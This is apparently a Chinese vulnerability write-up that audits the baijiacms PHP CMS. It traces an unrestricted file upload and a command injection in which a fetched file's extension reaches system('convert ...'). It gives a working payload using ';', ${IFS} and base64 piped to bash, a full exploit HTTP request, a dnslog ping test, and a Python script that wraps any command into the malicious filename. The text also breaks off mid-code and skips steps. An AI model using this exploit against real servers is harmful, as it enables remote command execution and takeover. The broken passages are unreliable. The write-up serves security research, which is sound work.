     $quality_command=' -quality '.intval($scal);
     }
     system('convert'.$quality_command.' '.$file_full_path.'
    '.$file_full_path);
     }
     //code
    }
$file_full_path 参数是调⽤的时候传⼊的，查询⼀下是谁调⽤过本函数，找到⼀  
处 system/weixin/class/web/setting.php ⽂件中的32⾏
研究⼀下什么时候才会调⽤到这⾥
[http://localhost:8888/baijiacms/index.php?mod=wexin&act=web&do=index&beid=1](http://localhost:8888/baijiacms/index.php?mod=wexin&act=web&do=index&beid=1)
暂时停下来，重新看⼀下调⽤情况
同⽂件的 file_upload() 函数也会调⽤ file_save() 函数，查看何处调⽤ file_upload()  
函数，找到 system/public/class/web/file.php ⽂件的28⾏调⽤
现在想访问到该函数
[http://localhost:8888/baijiacms/index.php?mod=system&act=web&do=upload](http://localhost:8888/baijiacms/index.php?mod=system&act=web&do=upload)
这⾥⽣成的是随机的⽂件名,并不存在上传漏洞，并且会执⾏到 file_upload() ⽅法
    function file_upload($file, $type = 'image') {
     if(empty($file)) {
     return error(-1, '没有上传内容');
     }
     $limit=5000;
     $extention = pathinfo($file['name'], PATHINFO_EXTENSION);
     $extention=strtolower($extention);
     if(empty($type)||$type=='image')
     {
    //很明显这⾥做了⽩名单限制
     $extentions=array('gif', 'jpg', 'jpeg', 'png');
     }
     if($type=='music')
     {
     $extentions=array('mp3','wma','wav','amr','mp4');
     }
     if($type=='other')
     {
     $extentions=array('gif', 'jpg', 'jpeg',
    'png','mp3','wma','wav','amr','mp4','doc');
     }
     if(!in_array(strtolower($extention), $extentions)) {
     return error(-1, '不允许上传此类⽂件');
     }
     if($limit * 1024 
于是就可以开始一个服务并且让其中存在一个whoami文件，并且启动本机的9999端口，让程序可以访问到就可以不进入该if判断了
现在再试试，可以看到现在的信息不一样了
实际查看本地上传的文件确实也上传上去了
查看断点的时候确实也没有进入第一个if判断
于是现在就要跟进到file_save()方法中，只有$file_full_path参数是可以控制的
而该处的file_full_path是上一个方法传入进来的，可以查看一下该参数的构造
    $url = trim($url);
    $extention = pathinfo($url,PATHINFO_EXTENSION );
    $path = '/attachment/';
    $extpath="{$extention}/" . date('Y/m/');
      mkdirs(WEB_ROOT . $path . $extpath);
      do {
        $filename = random(15) . ".{$extention}";
      } while(is_file(SYSTEM_WEBROOT . $path . $extpath. $filename));
    $file_tmp_name = SYSTEM_WEBROOT . $path . $extpath. $filename;
    $file_relative_path = $extpath. $filename;
首先获取到$extection变量是通过pathinfo()获取的，目前我们传入的文件是whoami文件，拓展名是空
然后执行到$filename = random(15).".{$extention}";就是随机生成一个文件名并追加上刚才的后缀，于是我们现在的文件名就是
于是这里其实上传一个php文件是不会限制后缀名的
上传成功
这里还有一个思考，该开发只对file_upload方法做了限制fetch_net_file_upload却并没有做任何限制，可见代码写的不严格。
4.2 命令执行  
找到上传漏洞并非本意，本意是想继续通过闭合直接构造RCE的，于是继续分析代码。
    $url = trim($url);
    $extention = pathinfo($url,PATHINFO_EXTENSION );
    //这里该参数就是获取的.后边的所有内容最后拼接到file_full_path中
    $path = '/attachment/';
    $extpath="{$extention}/" . date('Y/m/');
      mkdirs(WEB_ROOT . $path . $extpath);
      do {
        $filename = random(15) . ".{$extention}";
      } while(is_file(SYSTEM_WEBROOT . $path . $extpath. $filename));
    $file_tmp_name = SYSTEM_WEBROOT . $path . $extpath. $filename;
    $file_relative_path = $extpath. $filename;
    if (file_put_contents($file_tmp_name, file_get_contents($url)) == false) {
      $result['message'] = '提取失败.';
      return $result;
    }
    $file_full_path = WEB_ROOT .$path . $extpath. $filename;//这里拼接好了之后会直接传入进行命令执行
    function file_save($file_tmp_name,$filename,$extention,$file_full_path,$file_relative_path,$allownet=true){
      //code
      system('convert'.$quality_command.' '.$file_full_path.' '.$file_full_path);
    }
所以如果$extention变量中就存在;的话就会将后边的system()执行的内容分成两个命令去执行，尝试构造文件名为whoami.;ping -c 4
wk8imc.dnslog.cn，由于文件名中不能存在空格需要进行base64编码以及使用${IFS}来代替空格  
原payload：whoami.;echo ping -c 4 www.baidu.com  
处理之后payload：whoami.;echo${IFS}cGluZyAtYyA0IHd3dy5iYWlkdS5jb20=|base64${IFS}-d|bash;  
将该base64后的结果通过管道符输入linux的base64指令中，得到结果之后再通过管道符输入bash指令中去执行。
tips：${IFS}在bash中可以作为空格的替代品
于是我们本地存在了该文件
启动服务之后发送请求  
GET
/baijiacms/index.php?mod=site&act=public&do=file&op=fetch&url=[http://127.0.0.1:9999/whoami.;echo${IFS}cGluZyAtYyA0IHd3dy5iYWlkdS5jb20=|base64${IFS}-d|bash;&status=1&beid=1](http://127.0.0.1:9999/whoami.;echo${IFS}cGluZyAtYyA0IHd3dy5iYWlkdS5jb20=|base64${IFS}-d|bash;&status=1&beid=1)
HTTP/1.1  
Host: 127.0.0.1:8888  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0)
Gecko/20100101 Firefox/109.0  
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,
_/_ ;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Connection: close  
Cookie: PHPSESSID=eb6b5f409ab739f91dc88c3278fbe855  
Upgrade-Insecure-Requests: 1  
Sec-Fetch-Dest: document  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Site: cross-site  
Pragma: no-cache  
Cache-Control: no-cache  
确实执行了命令返回了输出结果
现在来进入代码调试一下，可以看到$extention变成了;echo${IFS}cGluZyAtYyA0IHd3dy5iYWlkdS5jb20=|base64${IFS}-d|bash;,  
果然截取了所有的.之后的内容作为后缀名。
继续跟进查看$file_full_path内容
/Applications/MAMP/htdocs/baijiacms/attachment/;echo${IFS}cGluZyAtYyA0IHd3dy5iYWlkdS5jb20=|base64${IFS}-d|bash;/2023/02/wYR5UQOPAzjEUT6.;echo${IFS}cGluZyAtYyA0IHd3dy5iYWlkdS5jb20=|base64${IFS}-d|bash;  
以上内容中存在一个;就可以将之后执行命令的代码，分成两个命令。
其要执行的命令是如下的内容  
convert -quality 100
/Applications/MAMP/htdocs/baijiacms/attachment/;echo${IFS}cGluZyAtYyA0IHd3dy5iYWlkdS5jb20=|base64${IFS}-d|bash;/2023/02/wYR5UQOPAzjEUT6.;echo${IFS}cGluZyAtYyA0IHd3dy5iYWlkdS5jb20=|base64${IFS}-d|bash;
/Applications/MAMP/htdocs/baijiacms/attachment/;echo${IFS}cGluZyAtYyA0IHd3dy5iYWlkdS5jb20=|base64${IFS}-d|bash;/2023/02/wYR5UQOPAzjEUT6.;echo${IFS}cGluZyAtYyA0IHd3dy5iYWlkdS5jb20=|base64${IFS}-d|bash;  
该函数遇到;的时候就会去重新执行我们的echo${IFS}cGluZyAtYyA0IHd3dy5iYWlkdS5jb20=|base64${IFS}-d|bash;命令，从而造成RCE。
使用Github中脚本：  
import base64
webpath = "/yourPath"  
cmd = input("cmd>>> ")
b64cmd = base64.b64encode(cmd.encode()).decode()
payload = f"echo {b64cmd}|base64 -d|bash"
print(payload)  
payload = payload.replace(' ','${IFS}')  
print(payload)
name = input("name>>>")  
payload = f"{name}.;{payload};"  
print(payload)
with open(file=webpath+payload,mode='w')as f:  
f.write('1')  
成功RCE